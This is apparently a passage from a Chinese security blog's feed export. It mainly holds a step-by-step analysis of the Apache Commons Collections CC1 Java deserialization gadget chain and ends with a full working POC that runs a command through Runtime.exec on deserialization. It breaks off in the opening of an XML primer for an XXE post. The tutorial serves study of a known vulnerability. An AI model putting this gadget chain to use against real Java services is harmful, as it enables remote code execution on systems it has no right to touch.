&quot;新值&quot;)`可能绕开外挂程序，遍历后通过`entry.setValue()`修改，才能确保外挂程序被调用，**底层原因：TransformedMap`的`Map.Entry`是改装过的（`AbstractMapEntryDecorator`的子类），它的`setValue()`方法被重写，主动调用`checkSetValue()，遍历是确保每个`Entry`都使用改装后的方法的关键步骤 </span><br></pre></td></tr></table></figure><p>一句话就是确保每个<code>Entry</code>都使用改装后的方法，进而更好调用setvalue去调用checkSetvalue</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMapDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">​    map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>); <span class="comment">//给map一个键值对，方便遍历</span></span><br><span class="line"></span><br><span class="line">​    <span class="comment">//构造transformedmap是调用tranform()的前置条件</span></span><br><span class="line">​    Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">​            map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet()) &#123;   <span class="comment">//遍历Map常用格式</span></span><br><span class="line">​        <span class="comment">//调用setValue方法，通过setValue去触发checkSetValue()</span></span><br><span class="line">​        entry.setValue(runtime);      </span><br><span class="line">​    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for(Map.Entry entry:transformedMap.entrySet()) &#123;   *//遍历Map常用格式*    entry.setValue(runtime);                      &#125;</span><br></pre></td></tr></table></figure><p>  在这里， transformedMap是经过装饰的 Map对象，具有特殊的行为。通过 entrySet() 方法获取了键值对的集合，然后进行遍历。transformedMap.entrySet()返回的是一个包含 <code>Map.Entry</code> 对象的集合，这样就可以遍历 M ap 的键值对。Map.Entry 是一个内部接口，用于表示<code>Map</code>中 的键值对，其中可以通过 getKey() 获取键，通过 getValue()获取值。</p><p>因为Map里的entrySet()是被transformedMap装饰器进行外挂的，本来是要去Map种的setvalue方法，但是经过装饰器的定义绘制街道MapEntry种调用里面的setValue方法进而去调用checkSetValue方法</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/d7418d2c06802f2f2f3715b5cd7b0d2.png"></p><p>梳理</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/9b9e63ced9a4747901d62b2c7088a6c.png"></p><p>首先，我们找到了TransformedMap这个类，我们想要调用其中的checkSetValue方法，但是这个类的构造器是peotected权限，只能类中访问，所以我们调用decorate方法来实例化这个类，</p><p> 在此之前我们先实例化了一个HashMap,并且调用了put方法给他赋了一个键值对(这里是为了让我们再后边的遍历中调用setValue()提供前置条件)，然后把这个map当成参数传入，实例化成了一个transformedmap对象，这个对象也是Map类型的，</p><p> 然后我们对这个对象进行遍历，在遍历过程中我们可以调用setValue方法，而恰好又遇到了一个重写了setValue的父类，这个重写的方法刚好调用了checkSetValue方法，这样就形成了一个闭环</p><p><strong>追寻setValue，找到readObject()</strong></p><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">    <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现了readobject下调用了setvalue</p><p>由于memberValues可控，这样我们就可以传入自己需要的，然后实现setValue方法</p><p>但是这个类没有说明是不是public之类的，也就是我们只能在包里面进行diaoyong，要想在外部调用的话就必须使用反射</p><p>copy的粗略的代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">    <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">            <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">    HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>); <span class="comment">//给map一个键值对，方便遍历</span></span><br><span class="line"></span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取sun.reflect.annotation.AnnotationInvocationHandler类的Class对象</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取指定参数类型的构造函数Constructor对象，这里我们能获取到估计就是它的那个构造函数</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"><span class="comment">// 相当于提升自己权限，以便可以访问非公共构造函数</span></span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里第一个是参数是注解的类原型，第二个就是我们之前的类</span></span><br><span class="line"><span class="comment">// 使用newInstance()方法创建一个新的AnnotationInvocationHandler实例</span></span><br><span class="line"><span class="comment">// 传递Override.class和decorate两个参数给构造函数</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Override.class, transformedMap);</span><br><span class="line">serialize(o);  <span class="comment">//序列化</span></span><br><span class="line">unserialize(<span class="string">&quot;CC1.txt&quot;</span>); <span class="comment">//反序列化</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义序列化方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC1.txt&quot;</span>));</span><br><span class="line">   oos.writeObject(object);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义反序列化方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">   ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">   objectInputStream.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现没有弹出计算器</p><h1 id="解决三个问题"><a href="#解决三个问题" class="headerlink" title="解决三个问题"></a>解决三个问题</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Runtime是没有实现Serializable接口的，无法序列化</span><br><span class="line">2. AnnotationInvocationHandler中的readObject执行 memberValue.setValue需要绕过两if判断</span><br><span class="line">3. memberValue.setValue中的值无法控制</span><br></pre></td></tr></table></figure><h3 id="Runtime是没有实现Serializable接口的，无法序列化"><a href="#Runtime是没有实现Serializable接口的，无法序列化" class="headerlink" title="Runtime是没有实现Serializable接口的，无法序列化"></a>Runtime是没有实现Serializable接口的，无法序列化</h3><p>虽然Runtime是没有实现Serializable接口的，可以运用反射来获取它的原型类，它的原型类Class是存在serializable接口，可以序列化的</p><p>改成下面这种形式</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        Class rc=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);                 <span class="comment">//获取类原型</span></span><br><span class="line">        Method getRuntime= rc.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);    <span class="comment">//获取getRuntime方法，</span></span><br><span class="line">        Runtime r=(Runtime) getRuntime.invoke(<span class="literal">null</span>,<span class="literal">null</span>);    <span class="comment">//获取实例化对象，因为该方法为无参方法，所以全为null</span></span><br><span class="line">        Method exec=rc.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);        <span class="comment">//获取exec方法</span></span><br><span class="line">        exec.invoke(r,<span class="string">&quot;calc&quot;</span>);                                         <span class="comment">//实现命令执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改成这样也是可以执行命令的；但是问题又来了，上面一共执行了三次<code>transform</code>方法。但是<code>InvokerTransformer</code>类中只能执行一次<code>transform</code>方法；</p><p>这里又要介绍一个需要利用的类<code>ChainedTransformer</code>;可以看一下此类的构造方法和<code>transform</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//传递一个transformers方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//一个for循环，将上一个对象当作下一个函数执行，循环嵌套</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们利用chainedTransformer</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">     <span class="type">Class</span> <span class="variable">runtimeClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);  <span class="comment">//获取原型类</span></span><br><span class="line">     Transformer[] Transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">     &#125;;</span><br><span class="line">     <span class="comment">//调用含参构造器传入Transformer数组，然后调用transform方法，这里对象只需要传一个原始的Runtime就行，因为其他都是嵌套的。</span></span><br><span class="line">     ChainedTransformer chainedTransformer= <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line">     chainedTransformer.transform(Runtime.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样可以运行</p><h3 id="解决setValue-方法无法执行的原因"><a href="#解决setValue-方法无法执行的原因" class="headerlink" title="解决setValue()方法无法执行的原因"></a><strong>解决setValue()方法无法执行的原因</strong></h3><p>setValue()方法是在两个if语句下边</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/e333e860070dd6d46ab0d3bfcd2a90f.png"></p><p>所以我们需要绕过这两个if语句才能执行</p><p>第一个if就是判断类型要不为空</p><p>第二个if</p><p>memberType.isInstance(value) || value instanceof ExceptionProxy：表示 value 是 memberType 类型的实例，或者是 ExceptionProxy 类型。</p><p>!()：对整个条件取反。，如果 value 既不是 memberType 的实例，也不是 ExceptionProxy，条件为真，进入 if 块。</p><h3 id="解决无法控制setValue值的问题"><a href="#解决无法控制setValue值的问题" class="headerlink" title="解决无法控制setValue值的问题"></a><strong><strong>解决无法控制setValue值的问题</strong></strong></h3><p>处理完if发现传进去的参数我们不可控</p><p>这里需要借助另一个类ConstantTransformer；这个类非常有意思，构造方法传递什么值，transform就返回什么值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; annotationInvocationHandler = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationHandler.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandler.newInstance(Target.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;环境搭建不说了 网上很多优秀的文章教学&lt;/p&gt;
&lt;p&gt;先列出利用的链子然后我们需要倒着进行分析&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;sp</summary>
      
    
    
    
    <category term="java" scheme="https://gu0f3n.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://gu0f3n.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>xxe漏洞</title>
    <link href="https://gu0f3n.github.io/2025/03/10/xxe%E6%BC%8F%E6%B4%9E/"/>
    <id>https://gu0f3n.github.io/2025/03/10/xxe%E6%BC%8F%E6%B4%9E/</id>
    <published>2025-03-10T13:47:11.000Z</published>
    <updated>2025-03-20T10:13:17.972Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a><strong>XML基础</strong></h3><p><a href="https://so.csdn.net/so/search?q=XML%E6%96%87%E6%A1%A3&spm=1001.2101.3001.7020">XML文档</a>结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML申明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [  &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span>  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span>     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">head</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>大白话解释下</p><h3 id="大白话版XML基础讲解"><a href="#大白话版XML基础讲解" class="headerlink" title="大白话版XML基础讲解"></a><strong>大白话版XML基础讲解</strong></h3><hr><h4 id="1-XML是啥？"><a href="#1-XML是啥？" class="headerlink" title="1. XML是啥？"></a><strong>1. XML是啥？</strong></h4><p>XML全称<strong>可扩展标记语言</strong>，你可以把它理解成一种<strong>“纯文本版的数据收纳盒”</strong>。它的核心作用是<strong>存储和传输结构化的数据</strong>，比如商品信息、用户资料等。举个栗子🌰：</p><ul><li><strong>HTML</strong>（网页语言）：负责把数据排版成好看的页面，比如字体颜色、表格布局。</li><li><strong>XML</strong>：只关心数据本身长啥样，比如一个商品的名字、价格、库存量。</li></ul><blockquote><p>📌 <strong>关键特点</strong>：标签可以自定义（比如 <code>&lt;手机型号&gt;小米13&lt;/手机型号&gt;</code>），不像HTML只能用固定标签（如 <code>&lt;p&gt;</code>）</p><p><strong>1</strong></p><p><strong>3</strong></p><p><strong>5</strong></p><p>。</p></blockquote><hr><h4 id="2-XML长什么样？"><a href="#2-XML长什么样？" class="headerlink" title="2. XML长什么样？"></a><strong>2. XML长什么样？</strong></h4><p>XML文档就像<strong>家谱</strong>，必须有一个<strong>“老祖宗”根标签</strong>，其他标签层层嵌套。比如：</p><p>xml</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  <span class="comment">&lt;!-- 文档声明（告诉电脑这是XML） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">超市</span>&gt;</span>  <span class="comment">&lt;!-- 根标签 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">商品</span> <span class="attr">分类</span>=<span class="string">&quot;饮料&quot;</span>&gt;</span>  <span class="comment">&lt;!-- 子标签，带属性 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">名称</span>&gt;</span>可乐<span class="tag">&lt;/<span class="name">名称</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">价格</span>&gt;</span>3.5<span class="tag">&lt;/<span class="name">价格</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">库存</span>&gt;</span>100<span class="tag">&lt;/<span class="name">库存</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">商品</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">超市</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><?xml version="1.0" encoding="UTF-8"?>  <!-- 文档声明（告诉电脑这是XML） -->&lt;超市&gt;  <!-- 根标签 --><br>  &lt;商品 分类&#x3D;”饮料”&gt;  <!-- 子标签，带属性 --><br>&lt;名称&gt;可乐&lt;&#x2F;名称&gt;<br>&lt;价格&gt;3.5&lt;&#x2F;价格&gt;<br>&lt;库存&gt;100&lt;&#x2F;库存&gt;<br>  &lt;&#x2F;商品&gt;<br>&lt;&#x2F;超市&gt;</li></ul><hr><h4 id="3-XML的规矩（语法）"><a href="#3-XML的规矩（语法）" class="headerlink" title="3. XML的规矩（语法）"></a><strong>3. XML的规矩（语法）</strong></h4><p>3.XML的规矩 (语法)<br>1.严格大小写：<Price>和<price>是俩不同的标签，电脑会认错68。<br>2.不能瞎起名：<br>）×不能用数字开头（如1&lt;1号商品&gt;<br>·×不能有空格（如&lt;商品名称&gt;）<br>·×别用特殊符号（如：或-）<br>3.躲开特殊字符：比如&lt;要写成&amp;lt；，否则电脑会以为是新标签。<br>4.注释写法：<!--这是注释-->，不能嵌套。</p><hr><h4 id="4-XML能干啥用？"><a href="#4-XML能干啥用？" class="headerlink" title="4. XML能干啥用？"></a><strong>4. XML能干啥用？</strong></h4><p>1. </p><p>   传数据</p><p>   